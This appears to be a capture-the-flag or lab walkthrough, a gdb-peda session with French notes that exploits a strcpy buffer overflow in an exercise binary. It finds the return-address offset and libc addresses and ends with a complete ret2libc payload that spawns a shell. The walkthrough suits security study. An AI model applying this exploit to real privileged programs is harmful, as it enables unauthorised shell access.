```bash
# check ASLR is off
$ cat /proc/sys/kernel/randomize_va_space
0
# check (E)xecutable stack
$ readelf -l bin02
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
$ peda bin02
gdb-peda$ r $(perl -e 'print "A"x100')
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ disas main
gdb-peda$ disas protect_affiche
# add breakpoints
gdb-peda$ b *0x08048434
Breakpoint 1 at 0x8048434
gdb-peda$ b *0x08048447
Breakpoint 2 at 0x8048447
# re-run and stop at 1st breakpoint
gdb-peda$ r $(perl -e 'print "A"x100')
=> 0x8048434 <protect_affiche>: push   ebp
Breakpoint 1, 0x08048434 in protect_affiche ()
gdb-peda$ x/xw $esp
0xbffffbcc:     0x08048533
# continue to 2nd breakpoint
gdb-peda$ c
=> 0x8048447 <protect_affiche+19>:      call   0x8048344 <strcpy@plt>
Breakpoint 2, 0x08048447 in protect_affiche ()
arg[0]: 0xbffffb93 --> 0xfffbc6b7
arg[1]: 0xbffffdc8 ('A' <repeats 100 times>)
# substract both addresses to get size
gdb-peda$ p/d 0xbffffbcc-0xbffffb93
$1 = 57
# re-run with size and check with ABCD
gdb-peda$ r $(perl -e 'print "A"x57 . "ABCD"')
Stopped reason: SIGSEGV
0x44434241 in ?? ()
# get libc addr
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xb7eabc90 <system>
gdb-peda$ p exit
$3 = {<text variable, no debug info>} 0xb7e9f2d0 <exit>
gdb-peda$ p execve
$2 = {<text variable, no debug info>} 0xb7f132b0 <execve>
gdb-peda$ x/50s *((char **)environ)
0xbffffe2d:      "SHELL=/bin/bash"
gdb-peda$ x/s 0xbffffe2d
0xbffffe2d:      "SHELL=/bin/bash"
gdb-peda$ x/s 0xbffffe2d+13
0xbffffe3a:      "sh"
gdb-peda$ x/x 0xbffffe2d+13
0xbffffe3a:     0x73
gdb-peda$p/x 0xbffffe2d+13
$4 = 0xbffffe3a
gdb-peda$

adresse sh 0xbffffe3a \x3a\xfe\xff\xbf
adresse exit 0xb7e9f2d0 \xd0\xf2\xe9\xb7
adresse system 0xb7eabc90 \x90\xbc\xea\xb7

$(perl -e 'print "A"x57 . "\x90\xbc\xea\xb7" . "\xd0\xf2\xe9\xb7" . "\x3a\xfe\xff\xbf"')

```